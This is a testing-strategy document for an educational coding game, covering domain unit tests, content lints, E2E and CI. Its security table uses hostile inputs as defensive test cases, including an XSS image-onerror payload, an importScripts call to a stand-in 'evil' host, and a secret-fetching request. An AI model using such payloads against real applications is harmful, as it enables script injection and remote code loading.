# 10 — Testing Strategy and Security Considerations

Covers deliverable B12. Acceptance criteria for every area the brief names, plus the content
lints that keep the curriculum honest.

---

## 1. Test layers

| Layer | Tool | Runs in | What it protects |
| --- | --- | --- | --- |
| Content validation | Node script | CI + pre-build | Missions are structurally and pedagogically valid |
| Unit | Vitest | CI, Node | Domain logic is correct in isolation |
| Integration | Vitest + fake adapter | CI, Node | The mission flow works end to end without a browser |
| E2E | Playwright | CI, Chromium | The real app works in a real browser |
| Security | Vitest + Playwright | CI | The sandbox fails safe |

**The ratio that matters:** the domain has no I/O, so the vast majority of tests are fast unit
tests. If the suite needs a browser to check the mentor, the architecture has leaked
(`07` R1).

---

## 2. Unit tests — domain

### 2.1 Content schema (`domain/content`)

| # | Test | Asserts |
| --- | --- | --- |
| CV1 | A valid mission parses | Returns the typed object |
| CV2 | Unknown key rejected | `SCHEMA_UNKNOWN_KEY` |
| CV3 | Missing `hints[3]` rejected | `SCHEMA_HINTS` |
| CV4 | `hints` out of level order rejected | `SCHEMA_HINTS` |
| CV5 | `entryPoint` absent from `starterCode` rejected | `SCHEMA_NO_ENTRY` |
| CV6 | Duplicate test ids rejected | `SCHEMA_DUP_TEST_ID` |
| CV7 | Prerequisite cycle detected | `REF_CYCLE` |
| CV8 | Prerequisite pointing forward in `order` rejected | `REF_PREREQ` |
| CV9 | Unknown concept id rejected | `REF_CONCEPT` |
| CV10 | All 12 shipped missions validate | Runs over `content/missions/*.json` |

### 2.2 Evaluation (`domain/evaluation`)

| # | Test | Asserts |
| --- | --- | --- |
| EV1 | All-pass report | `status: 'ok'`, every case passed |
| EV2 | One hidden failure | `visiblePassed: true`, `hiddenPassed` decremented |
| EV3 | Edge subset isolation | `edgePassed/edgeTotal` counts only `edge: true` cases |
| EV4 | Thrown exception normalized | `status: 'threw'`, message preserved, no stack leak to UI |
| EV5 | Timeout normalized | `status: 'timeout'` |
| EV6 | Mutation detection | Deep-frozen input, mutated by fake runner → `mutatedInput: true` |
| EV7 | Determinism probe | Fake runner returning random output → `nondeterministic: true` |
| EV8 | Rotation probe | Fake runner reading only index 0 → `prematureExit: true` |
| EV9 | Diff normalization | Object key order does not affect equality |
| EV10 | Budget verdict | `durationMs > budget` → `budget_exceeded` |

**EV8 is the important one.** It is the only test that proves the mentor can detect the most
common World 1 bug without inspecting source.

### 2.3 Diagnosis (`domain/diagnosis`)

| # | Test | Asserts |
| --- | --- | --- |
| D1 | Pure function | Same inputs → identical output across 100 runs |
| D2 | Priority order | A report that is both `E11` and `E05` classifies as `E11` |
| D3 | `LOW_ATTEMPT` cap | Attempt 1 with `E05` → level 1, not 2 |
| D4 | `E01`/`E02` exempt from the ladder | Syntax error on attempt 1 → level 2, specific message |
| D5 | `REPEAT` escalation | Same code twice → level +1 and modality switch |
| D6 | `NO_PROGRESS` | Identical source hash → `E14`, level 3 |
| D7 | Level-4 guard | `attempts: 3, hints: 3` → not offered; `attempts: 4, hints: 3` → offered |
| D8 | Level-4 content | The level-4 hint never contains the mission's solution lines |
| D9 | Unknown code fallback | No matching rule → `E_UNKNOWN`, generic prompt, no guess |
| D10 | Reasoning heuristic | Table of 12 sample answers → expected scores 0–3 |
| D11 | Reasoning cap | AI returns 3, deterministic returns 1 → final score ≤ 2 |
| D12 | Invalid AI JSON | Falls back to deterministic score, no error surfaced |

### 2.4 Mastery (`domain/mastery`)

| # | Test | Asserts |
| --- | --- | --- |
| MT1 | Formula | The worked example in `05` §11 reproduces exactly (0.783, 0.627, 0.376) |
| MT2 | Independence weight | 0 hints → 1.0; 3 hints → 0.7; reveal → floor 0.25 |
| MT3 | Reveal cap | Perfect score + reveal → level ≤ `practicing` |
| MT4 | Replayability | Delete derived mastery, recompute from events → identical output |
| MT5 | Recency window | 6th event drops the oldest |
| MT6 | Single-source cap | 5 perfect events from one mission → ≤ `proficient` |
| MT7 | Transfer gate | 2 missions, both with 2 hints → not `transferable` |
| MT8 | Transfer gate pass | 2 missions, one with ≤1 hint → `transferable` |
| MT9 | Reinforcement trigger | mastery 0.40 + 3 hints → enqueued |
| MT10 | Reinforcement cap | 3 pending → lowest mastery wins, 4th not enqueued |
| MT11 | Reinforcement isolation | 3 reinforced events alone → cannot reach `transferable` |

**MT4 is the invariant that makes the model auditable.** If mastery cannot be recomputed from
events, the player cannot be shown a truthful explanation of their own level.

### 2.5 Progression (`domain/progression`)

| # | Test | Asserts |
| --- | --- | --- |
| PG1 | Gate A | Mission locked until prerequisites are `completed` |
| PG2 | Gate B | Mission locked until concept levels meet `required` |
| PG3 | `completed` definition | Passing tests without reasoning → not `completed` |
| PG4 | World gate | World 2 locked while a World 1 primary is `introduced` |
| PG5 | World gate opens | All primaries `practicing` + M12 completed + `C16` introduced |
| PG6 | Independence asymmetry | `completed` advances within a world; `independent` required between worlds |
| PG7 | No orphan | Every mission is reachable from M01 via the prerequisite graph |

---

## 3. Integration tests

### 3.1 The full mission flow (the most valuable test in the suite)

```
load M01 → briefing rendered → strategy gate blocks run
→ submit strategy → lab opens
→ run with `>=` bug → E05 diagnosis + level-1 hint
→ request hint twice → level 2, then level 3
→ fix code → all green
→ debrief: reasoning 0 → not completed
→ reasoning 2 → completed, evidence emitted, map updates
```

Asserted at each step. One test, ~40 lines, covers the product.

### 3.2 Other integration cases

| # | Scenario | Asserts |
| --- | --- | --- |
| IT1 | Persist and restore | Progress survives a reload from the same store |
| IT2 | Corrupt store | Malformed JSON → start fresh, no crash, warning shown |
| IT3 | Version migration | `schemaVersion: 0` blob migrates without data loss |
| IT4 | Import/export round trip | Export → reset → import → identical progress |
| IT5 | Reinforcement decline | Declining does not block the next mission |
| IT6 | Replay a completed mission | Emits new evidence, does not duplicate unlock events |
| IT7 | Timeout recovery | Timeout → diagnosis → editor usable again immediately |

---

## 4. Content lints (pedagogical tests)

Implemented in `domain/content/lint.ts`, run in CI. Each lint is a test with a failing fixture
and a passing fixture, so the lint itself is tested.

| Lint | Rule | Failing fixture proves it |
| --- | --- | --- |
| **L1** | No `forbiddenVocabulary` term in briefing | A Set mission that says "usa un Set" |
| **L2** | 1 primary, ≤1 secondary concept | A mission tagging four concepts |
| **L3** | Efficiency enforcement requires a prior functional mission | MT10 before M09 |
| **L4** | Reward references a real system and a legal transition | Reward "50 XP" |
| **L5** | Four hints, ascending specificity, L4 contains no solution | L1 that says "usa `>`" |
| **L6** | No hidden/edge input equals a visible input | Hidden copy of `[95,90]` |
| **L7** | ≥2 edge cases from the closed set | A mission with only happy paths |
| **L8** | Debrief has cost + real-world, no placeholders | `realWorld: "TODO"` |

### The coverage test (not a lint, a curriculum invariant)

```
for each concept C01..C16:
    missions_with_role_not_reinforced(C) >= 2
```

This is `03` §4 as an executable assertion. If a mission is deleted or retagged and a concept
drops to one appearance, the build fails. That is the mechanism that prevents the curriculum
from silently degrading into a list of exercises.

---

## 5. E2E tests (Playwright)

Deliberately few. E2E is slow and flaky; it should cover what only a browser can.

| # | Path | Asserts |
| --- | --- | --- |
| X1 | First mission, happy path | Landing → green sensor in under 6 minutes of scripted interaction |
| X2 | First mission, failure path | Bug → diagnosis visible → hint → fix → debrief |
| X3 | Infinite loop | `while(true){}` → timeout in <2.5 s → tab still responsive → editor usable |
| X4 | Reload persistence | Complete M01 → reload → map still shows sensor working |
| X5 | Keyboard-only run | Tab to editor, `Cmd+Enter` runs |
| X6 | Mid-mission reload | Attempts and diagnosis survive; editor buffer resets to the starter stub |

---

## 6. Security tests

These test that the sandbox **fails safe**, not that it is impenetrable. Given `08`'s threat
model, that is the honest goal.

| # | Attack | Expected |
| --- | --- | --- |
| S1 | `while(true){}` | Terminated at the budget; UI responsive; next run works |
| S2 | 10 GB array allocation | Either throws `RangeError` or the worker dies; main thread survives |
| S3 | `fetch('/api/secret')` | Throws "fetch is not available" (prelude) |
| S4 | `indexedDB.open(...)` | Throws or is undefined |
| S5 | `importScripts('https://evil/x.js')` | Throws |
| S6 | Returns `<img src=x onerror=alert(1)>` | Rendered as literal text; no execution |
| S7 | Returns a 5 MB string | Rejected by the output cap with `E12` |
| S8 | `postMessage` flood from worker | Rate-limited; UI not blocked |
| S9 | Prototype pollution via returned object | `Object.prototype` unchanged on the main thread (structured clone boundary) |
| S10 | `localStorage.clear()` | No effect (not available in worker) |
| S11 | `console.log` of a hidden input (`e2e/console.spec.ts` C2) | Not shown; at most a content-free "hubo salida en pruebas ocultas" line |
| S12 | `console.log` of a circular object, a throwing Proxy, 100 000 lines (C4) | Run completes; output capped with a notice; no `internal_error` |

S6 and S9 are the ones that protect *other users later*. S3–S5 are honest about being
mitigations rather than guarantees: the test asserts the prelude's behaviour, not the
impossibility of escape.

### What we do not test, and say so

We do not test that the sandbox resists a determined same-origin attacker, because it does not.
`08` §8 forbids claiming otherwise, and a test asserting it would be a lie encoded in CI.

---

## 7. Acceptance criteria

The brief's ten areas, each with a criterion that can be checked by running something.

| Area | Acceptance criterion |
| --- | --- |
| **Mission schema validation** | All 12 missions validate; every rule V1–V12 and L1–L8 has a passing and a failing fixture; an invalid mission fails the build |
| **Deterministic test evaluation** | Same source + same mission → identical `EvaluationReport` across 100 runs; object key order irrelevant; `expected` compared structurally |
| **Hint progression** | Level never increases by more than 1 per intervention; level 2+ requires a prior hint or explicit request; level 4 unreachable below `attempts ≥ 4 && hints ≥ 3`; L4 text contains no solution line |
| **Adaptive mentor behaviour** | Each row of the `04` §5 matrix has a test that produces the specified intervention; the classifier is pure (D1); every `E01–E22` has at least one fixture |
| **Mastery updates** | `05` §11 worked example reproduces exactly; deleting derived state and recomputing from events is byte-identical; all caps and the transfer gate have tests |
| **Prerequisite and unlock logic** | No mission is unreachable (PG7); no cycle (CV7); world gate has both a blocked and an open test; independence asymmetry asserted |
| **Error and timeout handling** | Timeout ≤ budget + 500 ms; UI responsive after every failure class; `internal_error` never classified as a player error; `E_UNKNOWN` rate observable |
| **Persistence and restoration** | Round trip is lossless; corrupt blob starts fresh without crashing; migration from the previous `schemaVersion` preserves evidence |
| **Responsive UI** | Lab renders correctly at 1280, 1024, 900 px; below 900 px shows the desktop-only message; no horizontal scroll at 900 px |
| **Security boundaries** | S1–S10 pass; no user-facing copy claims "sandbox" or "secure"; CSP documented |

---

## 8. CI pipeline

```
1. typecheck            tsc --noEmit
2. lint                 eslint (includes import-boundary rules)
3. validate:content     schema + L1–L8 + coverage
4. test:unit            vitest run (domain)
5. test:integration     vitest run (with fake ExecutionPort)
6. build                vite build
7. test:e2e             playwright (chromium only)
8. budget check         bundle < 300 kB gzip, first paint < 1.5 s
```

Steps 1–5 must pass in under 30 seconds locally. If they do not, developers stop running them,
and the content lints — the thing protecting the curriculum — stop mattering.

---

## 9. What we deliberately do not test

| Not tested | Why |
| --- | --- |
| Visual regression | No stable baseline yet; the design will change during MT1–MT2 |
| Cross-browser matrix | Chromium first; Firefox/Safari once the flow is stable |
| Load/performance at scale | No backend, no concurrency in the MVP |
| AI reasoning quality | No AI in the MVP (D4). If added, evaluate offline, not in CI |
| Sandbox escape resistance | It does not resist; see §6 |
| Content *quality* | Lints check structure and leakage, not whether a hint is good. That is what playtesting is for |
